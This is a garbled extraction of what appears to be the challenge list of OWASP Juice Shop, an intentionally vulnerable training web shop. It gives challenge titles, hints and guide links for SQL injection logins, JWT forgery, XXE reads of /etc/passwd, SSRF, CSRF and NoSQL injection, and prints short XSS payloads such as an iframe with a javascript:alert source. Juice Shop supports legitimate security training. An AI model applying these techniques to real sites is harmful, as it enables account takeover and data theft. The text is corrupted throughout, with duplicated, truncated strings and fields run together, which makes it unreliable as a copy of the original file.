coupon code.'Succes ...  code.'Try to identify past special event or holiday campaigns of the shop first.'Try to ... first.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_successfully_redeem_an_expired_campaign_coupon_code'https: ... n_code'name: ' ... Coupon'Extra Language'Extra Language'Retrieve the language file that never made it into production.'Retrie ... ction.'Brute force is not the only option for this challenge, but a perfectly viable one.'Brute  ... e one.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-anti-automation.html#_retrieve_the_language_file_that_never_made_it_into_production'https: ... uction'name: ' ... nguage'Five-Star Feedback'Five-Star Feedback'Get rid of all 5-star customer feedback.'Get ri ... dback.'Once you found admin section of the application, this challenge is almost trivial.'Once y ... ivial.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_get_rid_of_all_5_star_customer_feedback'https: ... edback'name: ' ... edback'Forged Coupon'Forged Coupon'Cryptographic Issues'Crypto ... Issues'Forge a coupon code that gives you a discount of at least 80%.'Forge  ... t 80%.'Try either a) a knowledgeable brute force attack or b) reverse engineering or c) some research in the cloud.'Try ei ... cloud.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/cryptographic-issues.html#_forge_a_coupon_code_that_gives_you_a_discount_of_at_least_80'https: ... ast_80'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.htmlForged Feedback'Forged Feedback'Post some feedback in another user's name."Post s ...  name."You can solve this by tampering with the user interface or by intercepting the communication with the RESTful backend.'You ca ... ckend.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_post_some_feedback_in_another_users_name'https: ... s_name'order: 8Forged Review'Forged Review'Post a product review as another user or edit any user's existing review.'Post a ... eview.'Observe the flow of product review posting and editing and see if you can exploit it.'Observ ... it it.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_post_a_product_review_as_another_user_or_edit_any_users_existing_review'https: ... review'name: ' ... Review'Forged Signed JWT'Forged Signed JWT'Forge an almost properly RSA-signed JWT token that impersonates the (non-existing) user <i>rsa_lord@juice-sh.op</i>.'Forge  ... p</i>.'This challenge is explicitly not about acquiring the RSA private key used for JWT signing.'This c ... gning.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_forge_an_almost_properly_rsa_signed_jwt_tokenhttps://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.htmlWindows- Windowsname: ' ... ed JWT'Forgotten Developer Backup'Forgot ... Backup'Access a developer's forgotten backup file.'Access ...  file.'You need to trick a security mechanism into thinking that the file you want has a valid file type.'You ne ...  type.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_access_a_developers_forgotten_backup_file'https: ... p_file'name: ' ... Backup'Forgotten Sales BackupAccess a salesman's forgotten backup file.https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_access_a_salesmans_forgotten_backup_fileFrontend Typosquatting'Fronte ... atting'<a href="/#/contact">Inform the shop</a> about a <i>typosquatting</i> imposter that dug itself deep into the frontend. (Mention the exact name of the culprit)'<a hre ... lprit)'This challenge has nothing to do with mistyping web domains. There is no conveniently misplaced file helping you with this one either. Or is there?'This c ... there?'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_inform_the_shop_about_a_typosquatting_imposter_that_dug_itself_deep_into_the_frontend'https: ... ontend'name: ' ... atting'GDPR Data Erasure'GDPR Data Erasure'Log in with Chris' erased user account.'Log in ... count.'Turns out that something is technically and legally wrong with the implementation of the "right to be forgotten" for users.'Turns  ... users.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_log_in_with_chris_erased_user_account'https: ... ccount'https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.htmlname: ' ... rasure'GDPR Data Theft'GDPR Data Theft'Steal someone else's personal data without using Injection.'Steal  ... ction.'Trick the regular Data Export to give you more than actually belongs to you.'Trick  ... o you.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_steal_someone_elses_personal_data_without_using_injectionname: ' ...  Theft'HTTP-Header XSS'HTTP-Header XSS'Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> through an HTTP header.'Perfor ... eader.'Finding a piece of displayed information that could originate from an HTTP header is part of this challenge.'Findin ... lenge.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_persisted_xss_attack_through_an_http_header'https: ... header'name: ' ... er XSS'Imaginary Challenge'Imagin ... llenge'Solve challenge #999. Unfortunately, this challenge does not exist.'Solve  ... exist.'You need to trick the hacking progress persistence feature into thinking you solved challenge #999.'You ne ...  #999.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/cryptographic-issues.html#_solve_challenge_999'https: ... ge_999'name: ' ... llenge'Leaked Access Logs'Leaked Access Logs'Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to. (Creating a new account with the same password does not qualify as a solution.)'Dumpst ... tion.)'Once you have it, a technique called "Password Spraying" might prove useful.'Once y ... seful.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_dumpster_dive_the_internet_for_a_leaked_password_and_log_in_to_the_original_user_account_it_belongs_to'https: ... ngs_to'https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.htmlname: ' ... s Logs'Leaked Unsafe Product'Leaked ... roduct'Identify an unsafe product that was removed from the shop and <a href="/#/contact">inform the shop</a> which ingredients are dangerous.'Identi ... erous.'Your own SQLi and someone else's Ctrl-V will be your accomplices in this challenge!'Your o ... lenge!'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_identify_an_unsafe_product_that_was_removed_from_the_shop_and_inform_the_shop_which_ingredients_are_dangerous'https: ... gerous'name: ' ... roduct'Legacy Typosquatting'Legacy ... atting'<a href="/#/contact">Inform the shop</a> about a <i>typosquatting</i> trick it has been a victim of at least in <code>v6.2.0-SNAPSHOT</code>. (Mention the exact name of the culprit)This challenge has nothing to do with mistyping web domains. Investigate the forgotten developer's backup file instead.'This c ... stead.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_inform_the_shop_about_a_typosquatting_trick_it_has_been_a_victim_of'https: ... tim_of'Login Admin'Login Admin'Log in with the administrator's user account.Try different SQL Injection attack patterns depending whether you know the admin's email address or not.'Try di ... r not.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_log_in_with_the_administrators_user_accountorder: 5name: 'Login Admin'Login Amy'Login Amy'Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")'Log in ... Note")'This challenge will make you go after a needle in a haystack.'This c ... stack.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_log_in_with_amys_original_user_credentials'https: ... ntials'name: 'Login Amy'Login Bender'Login Bender'Log in with Bender's user account.If you know Bender's email address, try SQL Injection. Bender's password hash might not help you very much.'If you ...  much.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_log_in_with_benders_user_accountorder: 10name: 'Login Bender'Login Bjoern'Login Bjoern'- Code AnalysisLog in with Bjoern's Gmail account <i>without</i> previously changing his password, applying SQL Injection, or hacking his Google account.The security flaw behind this challenge is 100% OWASP Juice Shop's fault and 0% Google's.'The se ... le''s.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_log_in_with_bjoerns_gmail_accountname: 'Login Bjoern'Login Jim'Login Jim'Log in with Jim's user account.Try cracking Jim's password hash if you harvested it already. Alternatively, if you know Jim's email address, try SQL Injection.'Try cr ... ction.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_log_in_with_jims_user_accountorder: 9name: 'Login Jim'Login MC SafeSearch'Login  ... Search'Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.'Log in ... ypass.'You should listen to MC's hit song "Protect Ya Passwordz".'You sh ... ordz".'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_log_in_with_mc_safesearchs_original_user_credentialsname: ' ... Search'Login Support Team'Login Support Team'Log in with the support team's original user credentials without applying SQL Injection or any other bypass.The underlying flaw of this challenge is a lot more human error than technical weakness.'The un ... kness.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#_log_in_with_the_support_teams_original_user_credentialsname: ' ... t Team'Manipulate Basket'Manipulate Basket'Put an additional product into another user's shopping basket.'Put an ... asket.'Have an eye on the HTTP traffic while placing products in the shopping basket. Changing the quantity of products already in the basket doesn't count.'Have a ... count.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_put_an_additional_product_into_another_users_shopping_basket'https: ... basket'name: ' ... Basket'Misplaced Signature File'Mispla ... e File'Good Practice- Good PracticeAccess a misplaced <a href="https://github.com/Neo23x0/sigma">SIEM signature</a> file.https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_access_a_misplaced_siem_signature_file'https: ... e_file'name: ' ... e File'Multiple Likes'Multiple Likes'Like any review at least three times as the same user.'Like a ...  user.'Punctuality is the politeness of kings.'Punctu ... kings.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-anti-automation.html#_like_any_review_at_least_three_times_as_the_same_user'https: ... e_user'name: ' ...  Likes'Nested Easter Egg'Nested Easter Egg'Apply some advanced cryptanalysis to find <i>the real</i> easter egg.'Apply  ... r egg.'You might have to peel through several layers of tough-as-nails encryption for this challenge.'You mi ... lenge.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/cryptographic-issues.html#_apply_some_advanced_cryptanalysis_to_find_the_real_easter_eggname: ' ... er Egg'NoSQL DoS'NoSQL DoS'Let the server sleep for some time. (It has done more than enough hard work for you)'Let th ... r you)'This challenge is essentially a stripped-down Denial of Service (DoS) attack.'This c ... ttack.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_let_the_server_sleep_for_some_time'https: ... e_time'name: 'NoSQL DoS'NoSQL Exfiltration'NoSQL Exfiltration'All your orders are belong to us! Even the ones which don't.'All yo ... on''t.'Take a close look on how the $where query operator works in MongoDB.'Take a ... ngoDB.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_all_your_orders_are_belong_to_us'https: ... _to_us'https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.htmlNoSQL Manipulation'NoSQL Manipulation'Update multiple product reviews at the same time.'Update ...  time.'Take a close look on how the equivalent of UPDATE-statements in MongoDB work.'Take a ...  work.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_update_multiple_product_reviews_at_the_same_timename: ' ... lation'Outdated Allowlist'Outdated Allowlist'Unvalidated Redirects'Unvali ... irects'Let us redirect you to one of our crypto currency addresses which are not promoted any longer.'Let us ... onger.'We might have failed to take this out of our code properly.'We mig ... perly.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/unvalidated-redirects.html#_let_us_redirect_you_to_one_of_our_crypto_currency_addresses'https: ... resses'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.htmlname: ' ... owlist'Password Strength'Password Strength'Log in with the administrator's user credentials without previously changing them or applying SQL Injection.'Log in ... ction.'This one should be equally easy to a) brute force, b) crack the password hash or c) simply guess.'This o ... guess.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_log_in_with_the_administrators_user_credentials_without_previously_changing_them_or_applying_sql_injectionorder: 6name: ' ... rength'Payback Time'Payback Time'Place an order that makes you rich.'Place  ...  rich.'You literally need to make the shop owe you any amount of money.'You li ... money.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_place_an_order_that_makes_you_rich'https: ... u_rich'name: 'Payback Time'Premium Paywall'Premium Paywall'<i class="far fa-gem"></i><i class="far fa-gem"></i><i class="far fa-gem"></i><i class="far fa-gem"></i><i class="far fa-gem"></i><!--IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==--> <a href="https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm" target="_blank"><i class="fab fa-btc fa-sm"></i> Unlock Premium Challenge</a> to access exclusive content.'<i cla ... ntent.'You do not have to pay anything to unlock this challenge! Nonetheless, donations are very much appreciated.'You do ... iated.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/cryptographic-issues.html#_unlock_premium_challenge_to_access_exclusive_content'https: ... ontent'https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.htmlname: ' ... aywall'Privacy Policy'Privacy Policy'Read our privacy policy.'Read o ... olicy.'We won't even ask you to confirm that you did. Just read it. Please. Pretty please.'We won ... lease.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/miscellaneous.html#_read_our_privacy_policy'https: ... policy'order: 4name: ' ... Policy'Privacy Policy Inspection'Privac ... ection'Prove that you actually read our privacy policy.'Prove  ... olicy.'Only by visiting a special URL you can confirm that you read it carefully.'Only b ... fully.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-through-obscurity.html#_prove_that_you_actually_read_our_privacy_policyProduct Tampering'Product Tampering'Change the <code>href</code> of the link within the <a href="/#/search?q=OWASP SSL Advanced Forensic Tool (O-Saft)">OWASP SSL Advanced Forensic Tool (O-Saft)</a> product description into <i>https://owasp.slack.com</i>.'Change ... m</i>.'Look for one of the following: a) broken admin functionality, b) holes in RESTful API or c) possibility for SQL Injection.'Look f ... ction.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_change_the_href_of_the_link_within_the_o_saft_product_description'https: ... iption'https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.htmlname: ' ... pering'Reflected XSS'Reflected XSS'Perform a <i>reflected</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code>.Look for a url parameter where its value appears in the page it is leading to.'Look f ... ng to.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_reflected_xss_attackname: ' ... ed XSS'Repetitive Registration'Repeti ... ration'Follow the DRY principle while registering a user.'Follow ...  user.'You can solve this by cleverly interacting with the UI or bypassing it altogether.'You ca ... ether.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_follow_the_dry_principle_while_registering_a_user'https: ... a_user'Reset Bender's Password'Reset  ... ssword'Reset Bender's password via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.Not as trivial as Jim's but still not too difficult with some "Futurama" background knowledge.'Not as ... ledge.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_reset_benders_password_via_the_forgot_password_mechanismReset Bjoern's PasswordReset the password of Bjoern's internal account via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.Nothing a little bit of Facebook stalking couldn't reveal. Might involve a historical twist.'Nothin ... twist.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_reset_the_password_of_bjoerns_internal_account_via_the_forgot_password_mechanismReset Jim's PasswordReset Jim's password via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.It's hard for celebrities to pick a security question from a hard-coded list where the answer is not publicly exposed.'It''s  ... posed.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_reset_jims_password_via_the_forgot_password_mechanismReset Morty's PasswordReset Morty's password via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>his obfuscated answer</i> to his security question.Find a way to bypass the rate limiting and brute force the obfuscated answer to Morty's security question.'Find a ... stion.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-anti-automation.html#_reset_mortys_password_via_the_forgot_password_mechanismhttps://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.htmlRetrieve Blueprint'Retrieve Blueprint'Deprive the shop of earnings by downloading the blueprint for one of its products.'Depriv ... ducts.'The product you might want to give a closer look is the OWASP Juice Shop Logo (3D-printed).'The pr ... nted).'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_deprive_the_shop_of_earnings_by_downloading_the_blueprint_for_one_of_its_products'https: ... oducts'name: ' ... eprint'SSRF'SSRF'Request a hidden resource on server through server.'Reques ... erver.'Reverse engineering something bad can make good things happen.'Revers ... appen.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_request_a_hidden_resource_on_server_through_serverhttps://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.htmlname: 'SSRF'SSTi'SSTi'Infect the server with juicy malware by abusing arbitrary command execution.'Infect ... ution.'"SSTi" is a clear indicator that this has nothing to do with anything Angular. Also, make sure to use only our non-malicious malware.'"SSTi" ... lware.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution'https: ... cution'name: 'SSTi'Score Board'Score Board'Find the carefully hidden 'Score Board' page.'Find t ...  page.'Try to find a reference or clue behind the scenes. Or simply guess what URL the Score Board might have.'Try to ...  have.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/score-board.html#_find_the_carefully_hidden_score_board_page'https: ... d_page'order: 1name: 'Score Board'Security Policy'Security Policy'Behave like any "white-hat" should before getting into the action.'Behave ... ction.'Undoubtedly you want to read our security policy before conducting any research on our application.'Undoub ... ation.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/miscellaneous.html#_behave_like_any_white_hat_should_before_getting_into_the_action'https: ... action'https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.htmlServer-side XSS Protection'Server ... ection'Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> bypassing a <i>server-side</i> security mechanism.The "Comment" field in the "Customer Feedback" screen is where you want to put your focus on.'The "C ... us on.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_perform_a_persisted_xss_attack_bypassing_a_server_side_security_mechanismSteganography'Steganography'<a href="/#/contact">Rat out</a> a notorious character hiding in plain sight in the shop. (Mention the exact name of the character)'<a hre ... acter)'No matter how good your eyes are, you will need tool assistance for this challenge.'No mat ... lenge.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-through-obscurity.html#_rat_out_a_notorious_character_hiding_in_plain_sight_in_the_shop'https: ... e_shop'name: ' ... graphy'Successful RCE DoS'Successful RCE DoS'Perform a Remote Code Execution that occupies the server for a while without using infinite loops.'Perfor ... loops.'Your attack payload must not trigger the protection against too many iterations.'Your a ... tions.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/insecure-deserialization.html#_perform_a_remote_code_execution_that_occupies_the_server_for_a_while_without_using_infinite_loops'https: ... _loops'Supply Chain Attack'Supply ... Attack'<a href="/#/contact">Inform the development team</a> about a danger to some of <em>their</em> credentials. (Send them the URL of the <em>original report</em> or an assigned CVE or another identifier of this vulnerability)'<a hre ... ility)'This vulnerability will not affect any customer of the shop. It is aimed exclusively at its developers.'This v ... opers.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_inform_the_development_team_about_a_danger_to_some_of_their_credentialsname: ' ... Attack'Two Factor Authentication'Two Fa ... cation'Solve the 2FA challenge for user "wurstbrot". (Disabling, bypassing or overwriting his 2FA settings does not count as a solution)'Solve  ... ution)'The 2FA implementation requires to store a secret for every user. You will need to find a way to access this secret in order to solve this challenge.'The 2F ... lenge.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-authentication.html#_solve_the_2fa_challenge_for_user_wurstbrot'https: ... stbrot'https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.htmlname: ' ... cation'Unsigned JWT'Unsigned JWT'Forge an essentially unsigned JWT token that impersonates the (non-existing) user <i>jwtn3d@juice-sh.op</i>.This challenge exploits a weird option that is supported when signing tokens with JWT.'This c ... h JWT.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_forge_an_essentially_unsigned_jwt_tokenname: 'Unsigned JWT'Upload Size'Upload Size'Upload a file larger than 100 kB.'Upload ... 00 kB.'You can attach a small file to the "Complaint" form. Investigate how this upload actually works.'You ca ... works.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_upload_a_file_larger_than_100_kb'https: ... 100_kb'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.htmlname: 'Upload Size'Upload Type'Upload Type'Upload a file that has no .pdf or .zip extension.'Upload ... nsion.'You can attach a PDF or ZIP file to the "Complaint" form. Investigate how this upload actually works.https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_upload_a_file_that_has_no_pdf_or_zip_extension'https: ... ension'name: 'Upload Type'User Credentials'User Credentials'Retrieve a list of all user credentials via SQL Injection.Gather information on where user data is stored and how it is addressed. Then craft a corresponding UNION SELECT attack.'Gather ... ttack.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html#_retrieve_a_list_of_all_user_credentials_via_sql_injectionname: ' ... ntials'Video XSS'Video XSS'Embed an XSS payload <code>&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</code> into our promo video.'Embed  ... video.'You have to reuse the vulnerability behind one other 6-star challenge to be able to solve this one.'You ha ... s one.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_embed_an_xss_payload_into_our_promo_video'https: ... _video'name: 'Video XSS'View Basket'View Basket'View another user's shopping basket.'View a ... asket.'Have an eye on the HTTP traffic while shopping. Alternatively try to find a client-side association of users to their basket.'Have a ... asket.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_view_another_users_shopping_basketorder: 7name: 'View Basket'Vulnerable Library'Vulnerable Library'<a href="/#/contact">Inform the shop</a> about a vulnerable library it is using. (Mention the exact library name and version in your comment)'<a hre ... mment)'Report one of two possible answers via the "Customer Feedback" form. Do not forget to submit the library's version as well.'Report ...  well.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_inform_the_shop_about_a_vulnerable_library_it_is_using'https: ... _using'name: ' ... ibrary'Weird Crypto'Weird Crypto'<a href="/#/contact">Inform the shop</a> about an algorithm or library it should definitely not use the way it does.'<a hre ...  does.'Report one of four possible answers via the "Customer Feedback" form.'Report ...  form.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/cryptographic-issues.html#_inform_the_shop_about_an_algorithm_or_library_it_should_definitely_not_use_the_way_it_does'https: ... t_does'name: 'Weird Crypto'Allowlist Bypass'Allowlist Bypass'Enforce a redirect to a page you are not supposed to redirect to.'Enforc ... ct to.'You have to find a way to beat the allowlist of allowed redirect URLs.'You ha ...  URLs.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/unvalidated-redirects.html#_enforce_a_redirect_to_a_page_you_are_not_supposed_to_redirect_to'https: ... ect_to'XXE Data Access'XXE Data Access'XXE'XXE'Retrieve the content of <code>C:\Windows\system.ini</code> or <code>/etc/passwd</code> from the server.'Retrie ... erver.'The leverage point for this challenge is the deprecated B2B interface.'The le ... rface.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xxe.html#_retrieve_the_content_of_cwindowssystemini_or_etcpasswd_from_the_serverhttps://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.htmlname: ' ... Access'XXE DoS'XXE DoS'Give the server something to chew on for quite a while.'Give t ... while.'It is not as easy as sending a large amount of data directly to the deprecated B2B interface.'It is  ... rface.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xxe.html#_give_the_server_something_to_chew_on_for_quite_a_while'https: ... _while'name: 'XXE DoS'Zero Stars'Zero Stars'Give a devastating zero-star feedback to the store.'Give a ... store.'Before you invest time bypassing the API, you might want to play around with the UI a bit.'Before ... a bit.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_give_a_devastating_zero_star_feedback_to_the_storename: 'Zero Stars'Missing Encoding'Missing Encoding'Retrieve the photo of Bjoern's cat in "melee combat-mode".'Retrie ... mode".'Check the Photo Wall for an image that could not be loaded correctly.'Check  ... ectly.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_retrieve_the_photo_of_bjoerns_cat_in_melee_combat_mode'https: ... t_mode'name: ' ... coding'Cross-Site Imaging'Cross-Site Imaging'Stick <a href="http://placekitten.com/" target="_blank">cute cross-domain kittens</a> all over our delivery boxes.'Stick  ... boxes.'This challenge would formally have to be in several categories as the developers made multiple gaffes for this to be possible.'This c ... sible.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#_stick_cute_cross_domain_kittens_all_over_our_delivery_boxes'https: ... _boxes'name: ' ... maging'Exposed Metrics'Exposed Metrics'Find the endpoint that serves usage data to be scraped by a <a href="https://github.com/prometheus/prometheus">popular monitoring system</a>.'Find t ... m</a>.'Try to guess what URL the endpoint might have.https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_find_the_endpoint_that_serves_usage_data_to_be_scraped_by_a_popular_monitoring_system'https: ... system'name: ' ... etrics'Deluxe Fraud'Deluxe Fraud'Obtain a Deluxe Membership without paying for it.'Obtain ... or it.'Look closely at what happens when you attempt to upgrade your account.'Look c ... count.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_obtain_a_deluxe_membership_without_paying_for_it'https: ... for_it'name: 'Deluxe Fraud'CSRF'CSRF'Change the name of a user by performing Cross-Site Request Forgery from <a href="http://htmledit.squarefree.com">another origin</a>.'Change ... n</a>.'Find a form which updates the username and then construct a malicious page in the online HTML editor. You probably need an older browser version for this.'Find a ...  this.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/broken-access-control.html#_change_the_name_of_a_user_by_performing_cross_site_request_forgery_from_another_origin'https: ... origin'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.htmlname: ' ... owsers!Bonus Payload'Bonus Payload'Use the bonus payload <code>&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; allow=&quot;autoplay&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&amp;color=%23ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&quot;&gt;&lt;/iframe&gt;</code> in the <i>DOM XSS</i> challenge.'Use th ... lenge.'Copy + Paste = Solved!'Copy + ... olved!'https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html#_use_the_bonus_payload_in_the_dom_xss_challenge'https: ... llenge'order: 3name: ' ... ayload'Reset Uvogin's PasswordReset Uvogin's password via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.You might have to do some OSINT on his social media personas to find out his honest answer to the security question.'You mi ... stion.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_reset_uvogins_password_via_the_forgot_password_mechanismMeta Geo Stalking'Meta Geo Stalking'Determine the answer to John's security question by looking at an upload of him to the Photo Wall and use it to reset his password via the <a href="/#/forgot-password">Forgot Password</a> mechanism.'Determ ... anism.'Take a look at the meta data of the corresponding photo.'Take a ... photo.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_determine_the_answer_to_johns_security_question'https: ... estion'name: ' ... alking'Visual Geo Stalking'Visual ... alking'Determine the answer to Emma's security question by looking at an upload of her to the Photo Wall and use it to reset her password via the <a href="/#/forgot-password">Forgot Password</a> mechanism.Take a look at the details in the photo to determine the location of where it was taken.'Take a ... taken.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html#_determine_the_answer_to_emmas_security_questionKill Chatbot'Kill Chatbot'Permanently disable the support chatbot so that it can no longer answer customer queries.'Perman ... eries.'Think of a way to get a hold of the internal workings on the chatbot API.'Think  ... t API.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_permanently_disable_the_support_chatbot'https: ... hatbot'name: 'Kill Chatbot'Poison Null Byte'Poison Null Byte'Bypass a security control with a <a href="https://hakipedia.com/index.php/Poison_Null_Byte">Poison Null Byte</a> to access a file not meant for your eyes.'Bypass ...  eyes.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/improper-input-validation.html#_bypass_a_security_control_with_a_poison_null_byte'https: ... l_byte'name: ' ... l Byte'Bully Chatbot'Bully Chatbot'Receive a coupon code from the support chatbot.'Receiv ... atbot.'Just keep asking.'Just keep asking.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/miscellaneous.html#_receive_a_coupon_code_from_the_support_chatbotname: ' ... hatbot'Local File Read'Local File Read'You should read up on vulnerabilities in popular NodeJs template engines.'You sh ... gines.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/vulnerable-components.html#_gain_read_access_to_an_arbitrary_local_file_on_the_web_serverGain read access to an arbitrary local file on the web server.'Gain r ... erver.''lfrChallenge'name: ' ... e Read'Mass Dispel'Mass Dispel'Close multiple "Challenge solved"-notifications in one go.'Close  ... ne go.'Either check the official documentation or inspect a notification UI element directly.'Either ... ectly.'https://pwning.owasp-juice.shop/companion-guide/latest/part2/score-board.html#_close_multiple_challenge_solved_notifications_in_one_go'https: ... one_go'name: 'Mass 